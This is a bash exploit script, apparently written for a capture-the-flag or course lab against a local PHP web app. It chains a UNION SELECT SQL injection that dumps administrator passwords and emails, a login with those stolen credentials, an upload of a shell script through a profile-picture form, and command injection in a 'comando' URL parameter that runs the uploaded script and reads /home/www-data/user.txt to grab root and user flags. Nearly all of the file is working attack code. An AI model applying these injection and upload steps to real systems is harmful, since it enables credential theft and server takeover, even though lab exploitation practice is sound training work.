#!/bin/bash

# URL para obtener los datos de la consulta SQL
fetch_url="http://localhost/web/final/ulio-html/listadoFotosRovers.php?rover_id=%27e%27%20UNION%20SELECT%20fa.contrasena,%20fa.gmail,%201,%202,%203%20FROM%20final_usuarios%20fa,%20final_administradores%20f%20WHERE%20f.usuario_id%20=%20fa.id"

# Realizar la solicitud con curl y guardar la respuesta
response=$(curl -s "$fetch_url")

# Extraer los valores de photo_id (contraseña) y rover_id (gmail) usando jq
photo_id=$(echo "$response" | jq -r '.data[0].photo_id')
rover_id=$(echo "$response" | jq -r '.data[0].rover_id')

# Mostrar los valores obtenidos
echo "Contraseña: $photo_id"
echo "Gmail: $rover_id"

# Guardar los valores en un archivo
output_file="credentials.txt"
#echo "Contraseña: $photo_id" > "$output_file"
#echo "Gmail: $rover_id" >> "$output_file"

# Mostrar mensaje de éxito
#echo "Datos guardados en $output_file"

# URL para el login con los valores extraídos
login_url="http://localhost/web/final/loginConMod/login.php"

# Realizar el login con los datos extraídos usando curl
# Guardamos las cookies para mantener la sesión en un archivo cookies.txt
curl -X POST \
     -d "email=$rover_id" \
     -d "contrasena=$photo_id" \
     -d "es_administrador=on" \
     -c cookies.txt \
     "$login_url"

# Mostrar la respuesta del login
#echo "Login completado, cookies guardadas."
curl -X POST -F "profile_picture=@gdb.sh" http://localhost/web/final/dashmin/upload.php
# 1. URL para obtener los archivos y ejecutar el comando para obtener la flag_root
files_url_root="http://localhost/web/final/dashmin/list_uploads.php?comando=ls%20uploads%3B%20cd%20uploads;chmod%20744%20gdb.sh;./gdb.sh"

# Realizar la solicitud y almacenar la respuesta
files_response_root=$(curl -s -b cookies.txt "$files_url_root")

# Extraer la última línea de la respuesta (que contiene la flag_root)
flag_root=$(echo "$files_response_root" | tail -n 1)

# Guardar la flag_root en un archivo
flag_root_file="flag_root.txt"
#echo "Flag_root: $flag_root" > "$flag_root_file"
echo "FLAG ROOT: $flag_root"
# Mostrar mensaje de éxito para flag_root
#echo "Flag root guardada en $flag_root_file"

# 2. URL para obtener los archivos y ejecutar el comando para obtener la flag_usuario
files_url_usuario="http://localhost/web/final/dashmin/list_uploads.php?comando=ls%20uploads;cd;cd%20..;%20cat%20/home/www-data/user.txt"

# Realizar la solicitud y almacenar la respuesta
files_response_usuario=$(curl -s -b cookies.txt "$files_url_usuario")

# Extraer la última línea de la respuesta (que contiene la flag_usuario)
flag_usuario=$(echo "$files_response_usuario" | tail -n 1)
echo "FLAG USER: $flag_usuario"
# Guardar la flag_usuario en un archivo
flag_usuario_file="flag_usuario.txt"
#echo "Flag_usuario: $flag_usuario" > "$flag_usuario_file"

# Mostrar mensaje de éxito para flag_usuario
#echo "Flag usuario guardada en $flag_usuario_file"
